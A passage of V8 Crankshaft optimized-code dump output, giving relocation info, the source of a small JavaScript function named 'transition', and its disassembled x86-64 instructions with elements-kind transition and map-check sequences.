0x26c10af09bea  1322  01010000 | rcx | rdx (sp -> fp)  <none> argc: 2

RelocInfo (size = 1294)
0x26c10af096e3  comment  (;;; <@0,#0> -------------------- B0 --------------------)
0x26c10af096e3  comment  (;;; <@4,#3> prologue)
0x26c10af096e3  comment  (;;; Prologue begin)
0x26c10af096e3  comment  (;;; Prologue end)
0x26c10af096e3  comment  (;;; <@8,#5> -------------------- B1 --------------------)
0x26c10af096e3  comment  (;;; <@10,#6> context)
0x26c10af096e7  comment  (;;; <@11,#6> gap)
0x26c10af096eb  comment  (;;; <@14,#10> -------------------- B2 --------------------)
0x26c10af096eb  comment  (;;; <@15,#10> gap)
0x26c10af096ee  comment  (;;; <@16,#12> stack-check)
0x26c10af096f8  code target (BUILTIN)  (0x26c10ade9300)
0x26c10af096fc  comment  (;;; <@18,#12> lazy-bailout)
0x26c10af096fc  comment  (;;; <@20,#16> push-argument)
0x26c10af096fe  embedded object  (0x3459da703271 <JS Global Object>)
0x26c10af09708  comment  (;;; <@22,#13> constant-t)
0x26c10af0970a  embedded object  (0x4ce71232471 <JS Function swap (SharedFunctionInfo 0x4ce71231351)>)
0x26c10af09712  comment  (;;; <@23,#13> gap)
0x26c10af09716  comment  (;;; <@24,#18> invoke-function)
0x26c10af09723  comment  (;;; <@26,#19> lazy-bailout)
0x26c10af09723  comment  (;;; <@28,#20> constant-t)
0x26c10af09725  embedded object  (0x3459da70c651 <JS Array[2]>)
0x26c10af0972d  comment  (;;; <@30,#23> check-maps)
0x26c10af0972f  embedded object  (0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>)
0x26c10af09741  comment  (;;; <@32,#25> check-maps)
0x26c10af09741  comment  (;;; <@34,#27> check-maps)
0x26c10af09741  comment  (;;; <@36,#20> constant-t)
0x26c10af09743  embedded object  (0x3459da70c651 <JS Array[2]>)
0x26c10af0974b  comment  (;;; <@38,#28> load-named-field)
0x26c10af0974f  comment  (;;; <@40,#20> constant-t)
0x26c10af09751  embedded object  (0x3459da70c651 <JS Array[2]>)
0x26c10af09759  comment  (;;; <@42,#29> load-named-field)
0x26c10af09763  comment  (Abort message: )
0x26c10af09763  comment  (Operand is not a smi)
0x26c10af0976e  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09776  comment  (;;; <@44,#30> bounds-check)
0x26c10af0977f  comment  (;;; <@46,#136> constant-d)
0x26c10af0978e  comment  (;;; <@48,#31> store-keyed)
0x26c10af09793  comment  (;;; <@50,#47> gap)
0x26c10af09795  comment  (;;; <@52,#48> -------------------- B3 (loop header) --------------------)
0x26c10af09799  comment  (;;; <@54,#51> constant-t)
0x26c10af0979b  embedded object  (0x3459da70c509 <JS Array[2]>)
0x26c10af097a3  comment  (;;; <@56,#52> check-maps)
0x26c10af097a5  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af097b7  comment  (;;; <@58,#51> constant-t)
0x26c10af097b9  embedded object  (0x3459da70c509 <JS Array[2]>)
0x26c10af097c1  comment  (;;; <@60,#53> load-named-field)
0x26c10af097cb  comment  (Abort message: )
0x26c10af097cb  comment  (Operand is not a smi)
0x26c10af097d6  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af097de  comment  (;;; <@63,#54> compare-numeric-and-branch)
0x26c10af097e6  comment  (;;; <@64,#55> -------------------- B4 (unreachable/replaced) --------------------)
0x26c10af097e6  comment  (;;; <@68,#61> -------------------- B5 --------------------)
0x26c10af097e6  comment  (;;; <@70,#63> stack-check)
0x26c10af097f3  comment  (;;; <@72,#51> constant-t)
0x26c10af097f5  embedded object  (0x3459da70c509 <JS Array[2]>)
0x26c10af097fd  comment  (;;; <@74,#67> load-named-field)
0x26c10af09801  comment  (;;; <@76,#69> bounds-check)
0x26c10af09809  comment  (;;; <@78,#70> load-keyed)
0x26c10af0980e  comment  (;;; <@79,#70> gap)
0x26c10af09812  comment  (;;; <@80,#76> allocate)
0x26c10af09831  comment  (Abort message: )
0x26c10af09831  comment  (Unaligned allocation in new space)
0x26c10af0983c  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0984b  comment  (;;; <@81,#76> gap)
0x26c10af0984f  comment  (;;; <@82,#78> store-named-field)
0x26c10af09854  comment  (Abort message: )
0x26c10af09854  comment  (Operand is a smi)
0x26c10af0985f  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09866  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af09872  comment  (;;; <@84,#80> store-named-field)
0x26c10af09877  comment  (Abort message: )
0x26c10af09877  comment  (Operand is a smi)
0x26c10af09882  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09889  embedded object  (0x22ab7cc831d1 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af09895  comment  (;;; <@86,#82> store-named-field)
0x26c10af0989a  comment  (Abort message: )
0x26c10af0989a  comment  (Operand is a smi)
0x26c10af098a5  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af098ac  embedded object  (0x139738b02241 <FixedArray[0]>)
0x26c10af098b8  comment  (;;; <@88,#83> store-named-field)
0x26c10af098bd  comment  (Abort message: )
0x26c10af098bd  comment  (Operand is a smi)
0x26c10af098c8  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af098cf  embedded object  (0x139738b02311 <undefined>)
0x26c10af098db  comment  (;;; <@90,#84> store-named-field)
0x26c10af098e0  comment  (Abort message: )
0x26c10af098e0  comment  (Operand is a smi)
0x26c10af098eb  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af098f2  embedded object  (0x139738b02311 <undefined>)
0x26c10af098fe  comment  (;;; <@92,#85> store-named-field)
0x26c10af09903  comment  (Abort message: )
0x26c10af09903  comment  (Operand is a smi)
0x26c10af0990e  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09915  embedded object  (0x139738b02311 <undefined>)
0x26c10af09921  comment  (;;; <@94,#86> store-named-field)
0x26c10af09926  comment  (Abort message: )
0x26c10af09926  comment  (Operand is a smi)
0x26c10af09931  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09938  embedded object  (0x139738b02311 <undefined>)
0x26c10af09944  comment  (;;; <@96,#90> store-named-field)
0x26c10af09949  comment  (Abort message: )
0x26c10af09949  comment  (Operand is a smi)
0x26c10af09954  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0995b  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af09967  comment  (;;; <@98,#91> store-named-field)
0x26c10af0996c  comment  (Abort message: )
0x26c10af0996c  comment  (Operand is a smi)
0x26c10af09977  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af0997e  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af0998a  comment  (;;; <@100,#92> store-named-field)
0x26c10af0998f  comment  (Abort message: )
0x26c10af0998f  comment  (Operand is a smi)
0x26c10af0999a  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af099a1  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af099ad  comment  (;;; <@102,#93> store-named-field)
0x26c10af099b2  comment  (Abort message: )
0x26c10af099b2  comment  (Operand is a smi)
0x26c10af099bd  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af099c4  embedded object  (0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af099d0  comment  (;;; <@104,#94> check-non-smi)
0x26c10af099d9  comment  (;;; <@106,#36> constant-t)
0x26c10af099db  embedded object  (0x4ce71203cc1 <FixedArray[251]>)
0x26c10af099e3  comment  (;;; <@107,#36> gap)
0x26c10af099e6  comment  (;;; <@108,#95> transition-elements-kind)
0x26c10af099e8  embedded object  (0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>)
0x26c10af09a13  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af09a1c  code target (STUB)  (0x26c10af08900)
0x26c10af09a37  comment  (;;; <@110,#95> lazy-bailout)
0x26c10af09a37  comment  (;;; <@111,#95> gap)
0x26c10af09a3b  comment  (;;; <@112,#96> check-maps)
0x26c10af09a3d  embedded object  (0x22ab7cc83a69 <Map(FAST_ELEMENTS)>)
0x26c10af09a4f  comment  (;;; <@114,#101> load-named-field)
0x26c10af09a53  comment  (;;; <@116,#102> check-maps)
0x26c10af09a55  embedded object  (0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>)
0x26c10af09a67  comment  (;;; <@118,#103> load-named-field)
0x26c10af09a71  comment  (Abort message: )
0x26c10af09a71  comment  (Operand is not a smi)
0x26c10af09a7c  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09a84  comment  (;;; <@120,#104> bounds-check)
0x26c10af09a8d  comment  (;;; <@122,#75> constant-i)
0x26c10af09a8f  comment  (;;; <@123,#75> gap)
0x26c10af09a99  comment  (;;; <@124,#106> store-keyed)
0x26c10af09aa8  comment  (Abort message: )
0x26c10af09aa8  comment  (Operand is a smi)
0x26c10af09ab3  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09adb  code target (STUB)  (0x26c10af08da0)
0x26c10af09af3  comment  (;;; <@125,#106> gap)
0x26c10af09af7  comment  (;;; <@126,#111> add-i)
0x26c10af09afa  comment  (;;; <@129,#114> goto)
0x26c10af09aff  comment  (;;; <@130,#58> -------------------- B6 (unreachable/replaced) --------------------)
0x26c10af09aff  comment  (;;; <@134,#115> -------------------- B7 (unreachable/replaced) --------------------)
0x26c10af09aff  comment  (;;; <@138,#119> -------------------- B8 --------------------)
0x26c10af09aff  comment  (;;; <@140,#122> constant-d)
0x26c10af09b0e  comment  (;;; <@142,#20> constant-t)
0x26c10af09b10  embedded object  (0x3459da70c651 <JS Array[2]>)
0x26c10af09b18  comment  (;;; <@144,#128> load-named-field)
0x26c10af09b1c  comment  (;;; <@146,#20> constant-t)
0x26c10af09b1e  embedded object  (0x3459da70c651 <JS Array[2]>)
0x26c10af09b26  comment  (;;; <@148,#129> load-named-field)
0x26c10af09b30  comment  (Abort message: )
0x26c10af09b30  comment  (Operand is not a smi)
0x26c10af09b3b  code target (BUILTIN)  (0x26c10ad04120)
0x26c10af09b43  comment  (;;; <@150,#130> bounds-check)
0x26c10af09b4c  comment  (;;; <@152,#131> store-keyed)
0x26c10af09b51  comment  (;;; <@154,#2> constant-t)
0x26c10af09b53  embedded object  (0x139738b02311 <undefined>)
0x26c10af09b5b  comment  (;;; <@156,#134> return)
0x26c10af09b62  comment  (;;; <@70,#63> -------------------- Deferred stack-check --------------------)
0x26c10af09b81  external reference (Runtime::StackGuard)  (0x7fd2ca729030)
0x26c10af09b8a  code target (STUB)  (0x26c10ad06040)
0x26c10af09baa  comment  (;;; <@80,#76> -------------------- Deferred allocate --------------------)
0x26c10af09bce  embedded object  (0x4ce71203cc1 <FixedArray[251]>)
0x26c10af09bdd  external reference (Runtime::AllocateInTargetSpace)  (0x7fd2ca729b80)
0x26c10af09be6  code target (STUB)  (0x26c10ad06040)
0x26c10af09c0b  comment  (;;; -------------------- Jump table --------------------)
0x26c10af09c0c  runtime entry  (deoptimization bailout 2)
0x26c10af09c11  runtime entry  (deoptimization bailout 3)
0x26c10af09c16  runtime entry  (deoptimization bailout 4)
0x26c10af09c1b  runtime entry  (deoptimization bailout 6)
0x26c10af09c20  runtime entry  (deoptimization bailout 7)
0x26c10af09c25  runtime entry  (deoptimization bailout 9)
0x26c10af09c2a  runtime entry  (deoptimization bailout 10)
0x26c10af09c2f  runtime entry  (deoptimization bailout 11)
0x26c10af09c34  runtime entry  (deoptimization bailout 12)
0x26c10af09c38  comment  (;;; Safepoint table.)

--- End code ---
--- Raw source ---
() {
    for(var i = 0; i < array.length; i++){
        var arr = array[i];
        arr[0] = {};
    }
}


--- Optimized code ---
optimization_id = 1
source_position = 308
kind = OPTIMIZED_FUNCTION
name = transition
stack_slots = 8
compiler = crankshaft
Instructions (size = 1192)
0x26c10af09ce0     0  55             push rbp
0x26c10af09ce1     1  4889e5         REX.W movq rbp,rsp
0x26c10af09ce4     4  56             push rsi
0x26c10af09ce5     5  57             push rdi
0x26c10af09ce6     6  4883ec20       REX.W subq rsp,0x20
0x26c10af09cea    10  50             push rax
0x26c10af09ceb    11  b804000000     movl rax,0x4
0x26c10af09cf0    16  49baefdeefbeaddeefbe REX.W movq r10,0xbeefdeadbeefdeef
0x26c10af09cfa    26  4c8914c4       REX.W movq [rsp+rax*8],r10
0x26c10af09cfe    30  ffc8           decl rax
0x26c10af09d00    32  75f8           jnz 26  (0x26c10af09cfa)
0x26c10af09d02    34  58             pop rax
                  ;;; <@0,#0> -------------------- B0 --------------------
                  ;;; <@4,#3> prologue
                  ;;; Prologue begin
                  ;;; Prologue end
                  ;;; <@8,#5> -------------------- B1 --------------------
                  ;;; <@10,#6> context
0x26c10af09d03    35  488b45f8       REX.W movq rax,[rbp-0x8]
                  ;;; <@11,#6> gap
0x26c10af09d07    39  488945e8       REX.W movq [rbp-0x18],rax
                  ;;; <@14,#10> -------------------- B2 --------------------
                  ;;; <@15,#10> gap
0x26c10af09d0b    43  488bf0         REX.W movq rsi,rax
                  ;;; <@16,#12> stack-check
0x26c10af09d0e    46  493ba5700c0000 REX.W cmpq rsp,[r13+0xc70]
0x26c10af09d15    53  7305           jnc 60  (0x26c10af09d1c)
0x26c10af09d17    55  e8e4f5edff     call StackCheck  (0x26c10ade9300)    ;; code: BUILTIN
                  ;;; <@18,#12> lazy-bailout
                  ;;; <@20,#71> check-maps
                  ;;; <@22,#73> check-maps
                  ;;; <@24,#20> gap
0x26c10af09d1c    60  33db           xorl rbx,rbx
                  ;;; <@26,#21> -------------------- B3 (loop header) --------------------
0x26c10af09d1e    62  48895de0       REX.W movq [rbp-0x20],rbx
                  ;;; <@28,#24> constant-t
0x26c10af09d22    66  48b809c570da59340000 REX.W movq rax,0x3459da70c509    ;; object: 0x3459da70c509 <JS Array[2]>
                  ;;; <@30,#25> check-maps
0x26c10af09d2c    76  49ba693ac87cab220000 REX.W movq r10,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af09d36    86  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af09d3a    90  0f85f6030000   jnz 1110  (0x26c10af0a136)
                  ;;; <@32,#24> constant-t
0x26c10af09d40    96  48b809c570da59340000 REX.W movq rax,0x3459da70c509    ;; object: 0x3459da70c509 <JS Array[2]>
                  ;;; <@34,#26> load-named-field
0x26c10af09d4a   106  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af09d4e   110  41f6c201       testb r10,0x1
0x26c10af09d52   114  7410           jz 132  (0x26c10af09d64)
                  Abort message: 
                  Operand is not a smi
0x26c10af09d54   116  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af09d5e   126  e8bda3dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09d63   131  cc             int3l
0x26c10af09d64   132  8b501b         movl rdx,[rax+0x1b]
                  ;;; <@37,#27> compare-numeric-and-branch
0x26c10af09d67   135  3bda           cmpl rbx,rdx
0x26c10af09d69   137  0f8d13030000   jge 930  (0x26c10af0a082)
                  ;;; <@38,#28> -------------------- B4 (unreachable/replaced) --------------------
                  ;;; <@42,#34> -------------------- B5 --------------------
                  ;;; <@44,#36> stack-check
0x26c10af09d6f   143  493ba5700c0000 REX.W cmpq rsp,[r13+0xc70]
0x26c10af09d76   150  0f8217030000   jc 947  (0x26c10af0a093)
                  ;;; <@46,#24> constant-t
0x26c10af09d7c   156  48b809c570da59340000 REX.W movq rax,0x3459da70c509    ;; object: 0x3459da70c509 <JS Array[2]>
                  ;;; <@48,#40> load-named-field
0x26c10af09d86   166  488b400f       REX.W movq rax,[rax+0xf]
                  ;;; <@50,#42> bounds-check
0x26c10af09d8a   170  3bd3           cmpl rdx,rbx
0x26c10af09d8c   172  0f86a9030000   jna 1115  (0x26c10af0a13b)
                  ;;; <@52,#43> load-keyed
0x26c10af09d92   178  488b54d80f     REX.W movq rdx,[rax+rbx*8+0xf]
                  ;;; <@53,#43> gap
0x26c10af09d97   183  488955d8       REX.W movq [rbp-0x28],rdx
                  ;;; <@54,#49> allocate
0x26c10af09d9b   187  498b8d68fc0300 REX.W movq rcx,[r13+0x3fc68]
0x26c10af09da2   194  488bc1         REX.W movq rax,rcx
0x26c10af09da5   197  4883c038       REX.W addq rax,0x38
0x26c10af09da9   201  493b8570fc0300 REX.W cmpq rax,[r13+0x3fc70]
0x26c10af09db0   208  0f8725030000   ja 1019  (0x26c10af0a0db)
0x26c10af09db6   214  a807           test al,0x7
0x26c10af09db8   216  7410           jz 234  (0x26c10af09dca)
                  Abort message: 
                  Unaligned allocation in new space
0x26c10af09dba   218  48ba000000009e000000 REX.W movq rdx,0x9e00000000
0x26c10af09dc4   228  e857a3dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09dc9   233  cc             int3l
0x26c10af09dca   234  49898568fc0300 REX.W movq [r13+0x3fc68],rax
0x26c10af09dd1   241  48ffc1         REX.W incq rcx
                  ;;; <@55,#49> gap
0x26c10af09dd4   244  48894dd0       REX.W movq [rbp-0x30],rcx
                  ;;; <@56,#51> store-named-field
0x26c10af09dd8   248  f6c101         testb rcx,0x1
0x26c10af09ddb   251  7510           jnz 269  (0x26c10af09ded)
                  Abort message: 
                  Operand is a smi
0x26c10af09ddd   253  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09de7   263  e834a3dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09dec   268  cc             int3l
0x26c10af09ded   269  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af09df7   279  4c89510f       REX.W movq [rcx+0xf],r10
                  ;;; <@58,#53> store-named-field
0x26c10af09dfb   283  f6c101         testb rcx,0x1
0x26c10af09dfe   286  7510           jnz 304  (0x26c10af09e10)
                  Abort message: 
                  Operand is a smi
0x26c10af09e00   288  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09e0a   298  e811a3dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09e0f   303  cc             int3l
0x26c10af09e10   304  49bad131c87cab220000 REX.W movq r10,0x22ab7cc831d1    ;; object: 0x22ab7cc831d1 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09e1a   314  4c8951ff       REX.W movq [rcx-0x1],r10
                  ;;; <@60,#55> store-named-field
0x26c10af09e1e   318  f6c101         testb rcx,0x1
0x26c10af09e21   321  7510           jnz 339  (0x26c10af09e33)
                  Abort message: 
                  Operand is a smi
0x26c10af09e23   323  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09e2d   333  e8eea2dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09e32   338  cc             int3l
0x26c10af09e33   339  49ba4122b03897130000 REX.W movq r10,0x139738b02241    ;; object: 0x139738b02241 <FixedArray[0]>
0x26c10af09e3d   349  4c895107       REX.W movq [rcx+0x7],r10
                  ;;; <@62,#56> store-named-field
0x26c10af09e41   353  f6c101         testb rcx,0x1
0x26c10af09e44   356  7510           jnz 374  (0x26c10af09e56)
                  Abort message: 
                  Operand is a smi
0x26c10af09e46   358  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09e50   368  e8cba2dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09e55   373  cc             int3l
0x26c10af09e56   374  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af09e60   384  4c895117       REX.W movq [rcx+0x17],r10
                  ;;; <@64,#57> store-named-field
0x26c10af09e64   388  f6c101         testb rcx,0x1
0x26c10af09e67   391  7510           jnz 409  (0x26c10af09e79)
                  Abort message: 
                  Operand is a smi
0x26c10af09e69   393  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09e73   403  e8a8a2dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09e78   408  cc             int3l
0x26c10af09e79   409  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af09e83   419  4c89511f       REX.W movq [rcx+0x1f],r10
                  ;;; <@66,#58> store-named-field
0x26c10af09e87   423  f6c101         testb rcx,0x1
0x26c10af09e8a   426  7510           jnz 444  (0x26c10af09e9c)
                  Abort message: 
                  Operand is a smi
0x26c10af09e8c   428  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09e96   438  e885a2dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09e9b   443  cc             int3l
0x26c10af09e9c   444  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af09ea6   454  4c895127       REX.W movq [rcx+0x27],r10
                  ;;; <@68,#59> store-named-field
0x26c10af09eaa   458  f6c101         testb rcx,0x1
0x26c10af09ead   461  7510           jnz 479  (0x26c10af09ebf)
                  Abort message: 
                  Operand is a smi
0x26c10af09eaf   463  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09eb9   473  e862a2dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09ebe   478  cc             int3l
0x26c10af09ebf   479  49ba1123b03897130000 REX.W movq r10,0x139738b02311    ;; object: 0x139738b02311 <undefined>
0x26c10af09ec9   489  4c89512f       REX.W movq [rcx+0x2f],r10
                  ;;; <@70,#63> store-named-field
0x26c10af09ecd   493  f6c101         testb rcx,0x1
0x26c10af09ed0   496  7510           jnz 514  (0x26c10af09ee2)
                  Abort message: 
                  Operand is a smi
0x26c10af09ed2   498  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09edc   508  e83fa2dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09ee1   513  cc             int3l
0x26c10af09ee2   514  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09eec   524  4c895117       REX.W movq [rcx+0x17],r10
                  ;;; <@72,#64> store-named-field
0x26c10af09ef0   528  f6c101         testb rcx,0x1
0x26c10af09ef3   531  7510           jnz 549  (0x26c10af09f05)
                  Abort message: 
                  Operand is a smi
0x26c10af09ef5   533  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09eff   543  e81ca2dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09f04   548  cc             int3l
0x26c10af09f05   549  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09f0f   559  4c89511f       REX.W movq [rcx+0x1f],r10
                  ;;; <@74,#65> store-named-field
0x26c10af09f13   563  f6c101         testb rcx,0x1
0x26c10af09f16   566  7510           jnz 584  (0x26c10af09f28)
                  Abort message: 
                  Operand is a smi
0x26c10af09f18   568  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09f22   578  e8f9a1dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09f27   583  cc             int3l
0x26c10af09f28   584  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09f32   594  4c895127       REX.W movq [rcx+0x27],r10
                  ;;; <@76,#66> store-named-field
0x26c10af09f36   598  f6c101         testb rcx,0x1
0x26c10af09f39   601  7510           jnz 619  (0x26c10af09f4b)
                  Abort message: 
                  Operand is a smi
0x26c10af09f3b   603  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af09f45   613  e8d6a1dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af09f4a   618  cc             int3l
0x26c10af09f4b   619  49bab923f866211c0000 REX.W movq r10,0x1c2166f823b9    ;; object: 0x1c2166f823b9 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09f55   629  4c89512f       REX.W movq [rcx+0x2f],r10
                  ;;; <@78,#67> check-non-smi
0x26c10af09f59   633  f6c201         testb rdx,0x1
0x26c10af09f5c   636  0f84de010000   jz 1120  (0x26c10af0a140)
                  ;;; <@79,#67> gap
0x26c10af09f62   642  488bc2         REX.W movq rax,rdx
0x26c10af09f65   645  488b75e8       REX.W movq rsi,[rbp-0x18]
                  ;;; <@80,#68> transition-elements-kind
0x26c10af09f69   649  49ba793cc87cab220000 REX.W movq r10,0x22ab7cc83c79    ;; object: 0x22ab7cc83c79 <Map(FAST_DOUBLE_ELEMENTS)>
0x26c10af09f73   659  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af09f77   663  0f853d000000   jnz 730  (0x26c10af09fba)
0x26c10af09f7d   669  50             push rax
0x26c10af09f7e   670  51             push rcx
0x26c10af09f7f   671  52             push rdx
0x26c10af09f80   672  53             push rbx
0x26c10af09f81   673  56             push rsi
0x26c10af09f82   674  57             push rdi
0x26c10af09f83   675  4150           push r8
0x26c10af09f85   677  4151           push r9
0x26c10af09f87   679  4153           push r11
0x26c10af09f89   681  4154           push r12
0x26c10af09f8b   683  4156           push r14
0x26c10af09f8d   685  4157           push r15
0x26c10af09f8f   687  488d6424e0     REX.W leaq rsp,[rsp-0x20]
0x26c10af09f94   692  48bb693ac87cab220000 REX.W movq rbx,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af09f9e   702  e85de9ffff     call 0x26c10af08900     ;; code: STUB, TransitionElementsKindStub, minor: 1026
0x26c10af09fa3   707  488d642420     REX.W leaq rsp,[rsp+0x20]
0x26c10af09fa8   712  415f           pop r15
0x26c10af09faa   714  415e           pop r14
0x26c10af09fac   716  415c           pop r12
0x26c10af09fae   718  415b           pop r11
0x26c10af09fb0   720  4159           pop r9
0x26c10af09fb2   722  4158           pop r8
0x26c10af09fb4   724  5f             pop rdi
0x26c10af09fb5   725  5e             pop rsi
0x26c10af09fb6   726  5b             pop rbx
0x26c10af09fb7   727  5a             pop rdx
0x26c10af09fb8   728  59             pop rcx
0x26c10af09fb9   729  58             pop rax
                  ;;; <@82,#68> lazy-bailout
                  ;;; <@83,#68> gap
0x26c10af09fba   730  488b45d8       REX.W movq rax,[rbp-0x28]
                  ;;; <@84,#69> check-maps
0x26c10af09fbe   734  49ba693ac87cab220000 REX.W movq r10,0x22ab7cc83a69    ;; object: 0x22ab7cc83a69 <Map(FAST_ELEMENTS)>
0x26c10af09fc8   744  4c3950ff       REX.W cmpq [rax-0x1],r10
0x26c10af09fcc   748  0f8573010000   jnz 1125  (0x26c10af0a145)
                  ;;; <@86,#74> load-named-field
0x26c10af09fd2   754  488b580f       REX.W movq rbx,[rax+0xf]
                  ;;; <@88,#75> check-maps
0x26c10af09fd6   758  49ba0923f866211c0000 REX.W movq r10,0x1c2166f82309    ;; object: 0x1c2166f82309 <Map(FAST_HOLEY_ELEMENTS)>
0x26c10af09fe0   768  4c3953ff       REX.W cmpq [rbx-0x1],r10
0x26c10af09fe4   772  0f8560010000   jnz 1130  (0x26c10af0a14a)
                  ;;; <@90,#76> load-named-field
0x26c10af09fea   778  4c8b5017       REX.W movq r10,[rax+0x17]
0x26c10af09fee   782  41f6c201       testb r10,0x1
0x26c10af09ff2   786  7410           jz 804  (0x26c10af0a004)
                  Abort message: 
                  Operand is not a smi
0x26c10af09ff4   788  48ba0000000076000000 REX.W movq rdx,0x7600000000
0x26c10af09ffe   798  e81da1dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0a003   803  cc             int3l
0x26c10af0a004   804  8b401b         movl rax,[rax+0x1b]
                  ;;; <@92,#77> bounds-check
0x26c10af0a007   807  83f800         cmpl rax,0x0
0x26c10af0a00a   810  0f863f010000   jna 1135  (0x26c10af0a14f)
                  ;;; <@94,#48> constant-i
0x26c10af0a010   816  33c0           xorl rax,rax
                  ;;; <@95,#48> gap
0x26c10af0a012   818  488bd3         REX.W movq rdx,rbx
0x26c10af0a015   821  488bd8         REX.W movq rbx,rax
0x26c10af0a018   824  488b45d0       REX.W movq rax,[rbp-0x30]
                  ;;; <@96,#79> store-keyed
0x26c10af0a01c   828  488944da0f     REX.W movq [rdx+rbx*8+0xf],rax
0x26c10af0a021   833  488d5cda0f     REX.W leaq rbx,[rdx+rbx*8+0xf]
0x26c10af0a026   838  f6c201         testb rdx,0x1
0x26c10af0a029   841  7510           jnz 859  (0x26c10af0a03b)
                  Abort message: 
                  Operand is a smi
0x26c10af0a02b   843  48ba000000006f000000 REX.W movq rdx,0x6f00000000
0x26c10af0a035   853  e8e6a0dfff     call Abort  (0x26c10ad04120)    ;; code: BUILTIN
0x26c10af0a03a   858  cc             int3l
0x26c10af0a03b   859  483b03         REX.W cmpq rax,[rbx]
0x26c10af0a03e   862  7401           jz 865  (0x26c10af0a041)
0x26c10af0a040   864  cc             int3l
0x26c10af0a041   865  48250000f8ff   REX.W and rax,0xfffffffffff80000
0x26c10af0a047   871  f6400802       testb [rax+0x8],0x2
0x26c10af0a04b   875  7415           jz 898  (0x26c10af0a062)
0x26c10af0a04d   877  48c7c00000f8ff REX.W movq rax,0xfff80000
0x26c10af0a054   884  4823c2         REX.W andq rax,rdx
0x26c10af0a057   887  f6400804       testb [rax+0x8],0x4
0x26c10af0a05b   891  7405           jz 898  (0x26c10af0a062)
0x26c10af0a05d   893  e83eedffff     call 0x26c10af08da0     ;; code: STUB, RecordWriteStub, minor: 8962
0x26c10af0a062   898  48bbefbeadbeedbeadde REX.W movq rbx,0xdeadbeedbeadbeef
